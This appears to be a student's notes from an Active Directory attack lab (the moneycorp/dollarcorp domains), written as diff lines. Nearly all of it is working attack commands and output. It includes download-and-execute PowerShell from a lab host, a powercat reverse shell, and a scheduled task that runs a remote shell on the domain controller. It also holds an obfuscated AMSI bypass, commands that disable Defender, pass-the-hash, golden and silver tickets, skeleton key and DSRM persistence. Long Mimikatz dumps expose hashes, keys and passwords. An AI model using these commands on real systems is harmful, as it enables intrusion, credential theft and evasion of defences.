+    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student"}
+
+A-4
+? Enumerate all domains in the moneycorp.local forest.
+? Map the trusts of the dollarcorp.moneycorp.local domain.
+? Map External trusts in moneycorp.local forest.
+? Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
+
+
+
+A: 
+	Get-NetForestDomain -Verbose | %{ echo $_.Name}
+
+B: 
+	Enumerate Domain Trust in DollarCorp 
+		 Get-NetDomainTrust
+C:
+	Enumerate all Domain Trust in moneycorp 
+		 Get-NetForestDomain -Verbose | Get-NetDomainTrust
+
+	Enumerate only External Trust in MoneyCorp 
+		Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -match "External"}
+
+D:
+
+	Get-NetDomainTrust | ?{$_.TrustType -match "External"}
+	Get-NetForest -Forest eurocorp.local  -Verbose | Get-NetDomainTrust
+
+	
+	
+
+A-5
+? Exploit a service on dcorp-studentx and elevate privileges to local administrator.
+? Identify a machine in the domain where studentx has local administrative access.
+? Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -
+the dcorp-ci server
+
+
+
+A: 
+	1- Enumerate unqouted service paths 
+		 . .\PowerUp.ps1
+		 Get-ServiceUnquoted
+
+	2- Enumerate service which you can modify its binary 
+		
+		Get-ModifiableServiceFile -Verbose
+
+	3- Enumerate weak service permissions 
+		
+		 Get-ModifiableService
+
+	4- Add user to admins using the weak service permission name 
+	
+		 Invoke-ServiceAbuse  -Name SNMPTRAP -UserName 'dcorp\student348'
+
+B: 
+ 		Confirm Admin Local Access 
+		A- . .\Find-PSRemotingLocalAdminAccess.ps1
+		Find-PSRemotingLocalAdminAccess 
+
+		B- Find-LocalAdminAccess -Verbose
+		
+		Execute Remote Commands <<  Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local>> 
+
+
+C: 
+   Login using build user 		
+	. .\powercat.ps1
+	Build execute shell 
+		powershell.exe -c iex (iwr http://172.16.100.48/Invoke-PowerShellTCP.ps1);power -Reverse -IPAddress 172.16.100.48 -Port 443 
+	 
+		powercat -l -p 443 -verbose 
+
+
+A-7
+Domain user on one of the machines has access to a server where a domain admin is logged in.
+
+Identify:
+
+− The domain user
+− The server where the domain admin is logged in.
+
+● Escalate privileges to Domain Admin
+
+− Using the method above.
+− Using derivative local admin.
+
+FROM LOCAL TO DOMAIN ADMIN
+
+B: Escalate privileges to Domain Admin
+
+− Using the method above.
+− Using derivative local admin.
+
+
+Find-LocalAdminAccess
+Find-PSRemotingLocalAdminAccess
+Enter-PSSession -ComputerName dcorp-adminsrv
+
+
+$ExecutionContext.SessionState.LanguageMode
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+Copy-Item IM.ps1 '\\dcorp-adminsrv\C$\program files'
+.\IM.ps1 
+
+Authentication Id : 0 ; 976196 (00000000:000ee544)
+Session           : RemoteInteractive from 2
+User Name         : srvadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 9/5/2020 9:33:20 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1115
+        msv :
+         [00000003] Primary
+         * Username : srvadmin
+         * Domain   : dcorp
+         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
+         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
+         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
+        tspkg :
+        wdigest :
+         * Username : srvadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : srvadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 90282 (00000000:000160aa)
+Session           : Service from 0
+User Name         : appadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 9/5/2020 4:54:05 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1117
+        msv :
+         [00000003] Primary
+         * Username : appadmin
+         * Domain   : dcorp
+         * NTLM     : d549831a955fee51a43c83efb3928fa7
+         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
+         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
+        tspkg :
+        wdigest :
+         * Username : appadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : appadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ActuallyTheWebServer1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 90277 (00000000:000160a5)
+Session           : Service from 0
+User Name         : websvc
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 9/5/2020 4:54:05 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1113
+        msv :
+         [00000003] Primary
+         * Username : websvc
+         * Domain   : dcorp
+         * NTLM     : cc098f204c5887eaa8253e7c2749156f
+         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
+         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
+        tspkg :
+        wdigest :
+         * Username : websvc
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : websvc
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : AServicewhichIsNotM3@nttoBe
+        ssp :
+        credman :
+
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+
+> . .\PowerView.ps1
+> Invoke-UserHunter -CheckAccess 
+
+> $sess = new-PSSEssion -ComputerName dcorp-mgmt
+
+> Enter-PSSession -Session $sess 
+
+> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+
+> powershell -ep bypass 
+
+> iex (iwr http://172.16.100.48:8080/IM.ps1)
+
+[00000003] Primary
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
+         * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
+         * DPAPI    : b826a190021809d711368730cfc6e41d
+
+User Name         : svcadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 9/5/2020 4:54:04 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1122
+        msv :
+         [00000003] Primary
+         * Username : svcadmin
+         * Domain   : dcorp
+         * NTLM     : b38ff50264b74508085d82c69794a4d8
+         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
+         * DPAPI    : fd3c6842994af6bd69814effeedc55d3
+        tspkg :
+
+[!] Extract Keys : 
+
+>  Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+ Username : mgmtadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
+           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
+           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
+           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
+           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
+           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754
+
+* Username : svcadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ThisisBlasphemyThisisMadness!!
+         * Key List :
+           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
+           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
+           rc4_md4           b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
+           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
+
+[!] Stored Creds in Creds Store : 
+
+>  Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+
+> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+
+> Invoke-UserHunter -CheckAccess [Bingo] 
+
+
+RCE TO ADMIN
+Domain user on one of the machines has access to a server where a domain admin is logged in.
+
+Identify:
+
+− The domain user
+− The server where the domain admin is logged in.
+
+
+powercat -l -v -p 444 -t 100 
+
+iex (iwr http://172.16.100.48:8080/PowerView.ps1 -UseBasicParsin)
+
+
+Invoke-UserHunter -CheckAccess 
+
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
+
+A: PrivEscalation 
+
+iex (iwrhttp://172.16.100.48/Invoke-Mimikatz.ps1 -UseBasicParsing)
+
+$sess = New-PSSession -ComputerName dcorp-mgmt
+
+Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+
+Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+
+Invoke-Mimikatz  -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+
+CheckAdminAccess: Invoke-Command -ScriptBlocker {hostname;whoami} -ComputerName dcorp-dc 
+
+
+Session           : Service from 0
+User Name         : svcadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 9/5/2020 4:54:04 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1122
+        msv :
+         [00000003] Primary
+         * Username : svcadmin
+         * Domain   : dcorp
+         * NTLM     : b38ff50264b74508085d82c69794a4d8
+         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
+         * DPAPI    : fd3c6842994af6bd69814effeedc55d3
+        tspkg :
+        wdigest :
+         * Username : svcadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : svcadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ThisisBlasphemyThisisMadness!!
+        ssp :
+        credman :
+
+
+
+
+SID               : S-1-5-21-1874506631-3219952063-538504511-1121
+        msv :
+         [00000003] Primary
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
+         * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
+         * DPAPI    : b826a190021809d711368730cfc6e41d
+        tspkg :
+        wdigest :
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : mgmtadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+> Invoke-Mimikatz  -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+
+
+
+
+A-8
+
+● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
+● Using the NTLM hash of krbtgt account, create a Golden ticket.
+● Use the Golden ticket to (once again) get domain admin privileges from a machine. 
+
+
+> Powershell -ep bypass 
+
+> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`
+Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}"
+-f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
+
+> Enter-PSSession -Session $sess
+
+> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+
+> Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:dollarcorp.moneycorp.local /krbt
+ gt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /sid:S-1-5-21-1874506631-3219952063-538504511 /ptt"'
+
+> gwmi -Class win32_computersystem -ComputerName dcorp-dc
+
+A-9
+Try to get command execution on the domain controller by creating silver ticket for:
+	− HOST service
+	− WMI
+	
+RID  : 000003e8 (1000)
+User : DCORP-DC$
+LM   : 
+NTLM : 45824f594dbe3ec37155fd72bc676a8c
+
+
+HOST
+
+> Invoke-Mimikatz -Command '"kerberos::golden /SID:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /service:HOST /rc4:45824f594dbe3ec37155fd72bc676a8c /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /ptt"'
+
+>  schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Shell348" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.48:8080/shell.ps1''')'"
+
+> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Shell348"
+
+	SUCCESS: Attempted to run the scheduled task "Shell348".
+
+
+
+
+
+
+
+
+
+
+
+WMI
+> Invoke-Mimikatz -Command '"kerberos::golden /SID:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /service:HOST /rc4:45824f594dbe3ec37155fd72bc676a8c /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /ptt"'
+
+> Invoke-Mimikatz -Command '"kerberos::golden /SID:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /service:RPCSS /rc4:45824f594dbe3ec37155fd72bc676a8c /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /ptt"'
+
+> Get-WMIObject  -Class win32_operatingsystem -ComputerName dcorp-dc 
+> Get-WMIObject  -Class win32_operatingsystem -ComputerName dcorp-dc 
+
+
+A-10
+● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack. 
+
+> $sess = new-PSSession dcorp-dc 
+
+> Enter-PSSession -Session $sess 
+
+> powershell -ep bypass 
+
+> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`
+Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}"
+-f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+> Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
+
+> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+
+> Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
+
+password : mimikatz 
+
+
+A-11
+
+● Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence. 
+
+
+>	Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam" '
+
+> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+
+> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:dcorp-dc /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+
+
+ACCOUNTS
+Session           : Service from 0
+User Name         : svcadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 9/5/2020 4:54:04 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1122
+        msv :
+         [00000003] Primary
+         * Username : svcadmin
+         * Domain   : dcorp
+         * NTLM     : b38ff50264b74508085d82c69794a4d8
+         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
+         * DPAPI    : fd3c6842994af6bd69814effeedc55d3
+        tspkg :
+        wdigest :
+         * Username : svcadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : svcadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ThisisBlasphemyThisisMadness!!
+        ssp :
+        credman :
+
+
+
+
+SID               : S-1-5-21-1874506631-3219952063-538504511-1121
+        msv :
+         [00000003] Primary
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
+         * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
+         * DPAPI    : b826a190021809d711368730cfc6e41d
+        tspkg :
+        wdigest :
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : mgmtadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        
+        
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+
+
+MCORP-DC
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : mcorp / S-1-5-21-280534878-1496970234-700767426
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : 71d04f9d50ceb1f64de7a09f23e6dc4c
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   : 
+NTLM : ed277dd7a7a8a88d9ea0de839e454690
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   : 
+NTLM : 
+
+RID  : 0000b221 (45601)
+User : root347user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b222 (45602)
+User : root348user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b223 (45603)
+User : root349user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b224 (45604)
+User : root350user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b225 (45605)
+User : root351user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b226 (45606)
+User : root352user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b227 (45607)
+User : root353user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b228 (45608)
+User : root354user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b229 (45609)
+User : root355user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b22a (45610)
+User : root356user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b22b (45611)
+User : root357user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b22c (45612)
+User : root358user
+LM   : 
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 000003e8 (1000)
+User : MCORP-DC$
+LM   : 
+NTLM : f2b30b41c15fce41f1a4a05fc750c8df
+
+RID  : 00000835 (2101)
+User : DCORP-STDADMIN$
+LM   : 
+NTLM : 61608ac9d5219aa8ad8c8cf0f547ec2a
+
+RID  : 0000044f (1103)
+User : dcorp$
+LM   : 
+NTLM : 9f656e1657371e90ecdf21ab0aae510f
+
+
+
+DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : af0686cc0ca8f04df42210c9ac980760
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   : 
+NTLM : ff46a9d8bd66c6efd77603da26796f35
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   : 
+NTLM : 
+
+RID  : 00000455 (1109)
+User : ciadmin
+LM   : 
+NTLM : e08253add90dccf1a208523d02998c3d
+
+RID  : 00000458 (1112)
+User : sqladmin
+LM   : 
+NTLM : 07e8be316e3da9a042a9cb681df19bf5
+
+RID  : 00000459 (1113)
+User : websvc
+LM   : 
+NTLM : cc098f204c5887eaa8253e7c2749156f
+
+RID  : 0000045b (1115)
+User : srvadmin
+LM   : 
+NTLM : a98e18228819e8eec3dfa33cb68b0728
+
+RID  : 0000045d (1117)
+User : appadmin
+LM   : 
+NTLM : d549831a955fee51a43c83efb3928fa7
+
+RID  : 00000461 (1121)
+User : mgmtadmin
+LM   : 
+NTLM : 95e2cd7ff77379e34c6e46265e75d754
+
+RID  : 00000462 (1122)
+User : svcadmin
+LM   : 
+NTLM : b38ff50264b74508085d82c69794a4d8
+
+RID  : 0000046b (1131)
+User : studentadmin
+LM   : 
+NTLM : d1254f303421d3cdbdc4c73a5bce0201
+
+RID  : 00000470 (1136)
+User : sql1admin
+LM   : 
+NTLM : e999ae4bd06932620a1e78d2112138c6
+
+RID  : 000004bb (1211)
+User : testda
+LM   : 
+NTLM : a16452f790729fa34e8f3a08f234a82c
+
+RID  : 0000b02d (45101)
+User : student347
+LM   : 
+NTLM : a6e8f0d71ad8f28826c48e9013509810
+
+RID  : 0000b02e (45102)
+User : student348
+LM   : 
+NTLM : 769b7fc784d0c6c209609a9982b9ecfd
+
+RID  : 0000b02f (45103)
+User : student349
+LM   : 
+NTLM : 3b149dfe09e6c44b993f4fc17f72bb32
+
+RID  : 0000b030 (45104)
+User : student350
+LM   : 
+NTLM : f729e445bed2b32212527759270f7f04
+
+RID  : 0000b031 (45105)
+User : student351
+LM   : 
+NTLM : 58212a7b0ade24c06241b26035c89ffc
+
+RID  : 0000b032 (45106)
+User : student352
+LM   : 
+NTLM : 2195950e61bc0b6ddd5ae0decf70fbc6
+
+RID  : 0000b033 (45107)
+User : student353
+LM   : 
+NTLM : d763dccffd0077ae47932707bd34ff07
+
+RID  : 0000b034 (45108)
+User : student354
+LM   : 
+NTLM : 0912082eb5e3937b754cb0da51bdb3bd
+
+RID  : 0000b035 (45109)
+User : student355
+LM   : 
+NTLM : 92f4ae6dcdac7cf870b79f1758503d54
+
+RID  : 0000b036 (45110)
+User : student356
+LM   : 
+NTLM : b9bb7aaa77d2318cc28c5d3a16142dda
+
+RID  : 0000b037 (45111)
+User : student357
+LM   : 
+NTLM : b246e5b71207dad60b4d327d5ba39190
+
+RID  : 0000b038 (45112)
+User : student358
+LM   : 
+NTLM : 32272e643bd80195a8f227fcf7e523c6
+
+RID  : 0000b039 (45113)
+User : Control347user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b03a (45114)
+User : Control348user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b03b (45115)
+User : Control349user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b03c (45116)
+User : Control350user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b03d (45117)
+User : Control351user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b03e (45118)
+User : Control352user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b03f (45119)
+User : Control353user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b040 (45120)
+User : Control354user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b041 (45121)
+User : Control355user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b042 (45122)
+User : Control356user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b043 (45123)
+User : Control357user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b044 (45124)
+User : Control358user
+LM   : 
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000b045 (45125)
+User : Support347user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b046 (45126)
+User : Support348user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b047 (45127)
+User : Support349user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b048 (45128)
+User : Support350user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b049 (45129)
+User : Support351user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b04a (45130)
+User : Support352user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b04b (45131)
+User : Support353user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b04c (45132)
+User : Support354user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b04d (45133)
+User : Support355user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b04e (45134)
+User : Support356user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b04f (45135)
+User : Support357user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b050 (45136)
+User : Support358user
+LM   : 
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000b051 (45137)
+User : VPN347user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b052 (45138)
+User : VPN348user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b053 (45139)
+User : VPN349user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b054 (45140)
+User : VPN350user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b055 (45141)
+User : VPN351user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b056 (45142)
+User : VPN352user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b057 (45143)
+User : VPN353user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b058 (45144)
+User : VPN354user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b059 (45145)
+User : VPN355user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b05a (45146)
+User : VPN356user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b05b (45147)
+User : VPN357user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000b05c (45148)
+User : VPN358user
+LM   : 
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 000003e8 (1000)
+User : DCORP-DC$
+LM   : 
+NTLM : 45824f594dbe3ec37155fd72bc676a8c
+
+RID  : 00000454 (1108)
+User : DCORP-MGMT$
+LM   : 
+NTLM : 639c1adde3e0d1ba0d733c7d0d8f23ec
+
+RID  : 00000456 (1110)
+User : DCORP-CI$
+LM   : 
+NTLM : bc7c774ae1c2f9325adee16ff86681fc
+
+RID  : 00000457 (1111)
+User : DCORP-MSSQL$
+LM   : 
+NTLM : 5acf09c93df6805adf482810cc1a38e6
+
+RID  : 0000045a (1114)
+User : DCORP-ADMINSRV$
+LM   : 
+NTLM : 5e77978a734e3a7f3895fb0fdbda3b96
+
+RID  : 00000468 (1128)
+User : DCORP-APPSRV$
+LM   : 
+NTLM : dae2eb887cf962b2907c1273459b58e2
+
+RID  : 0000046f (1135)
+User : DCORP-SQL1$
+LM   : 
+NTLM : 130bb98c073825e0f4924622aa6eda7a
+
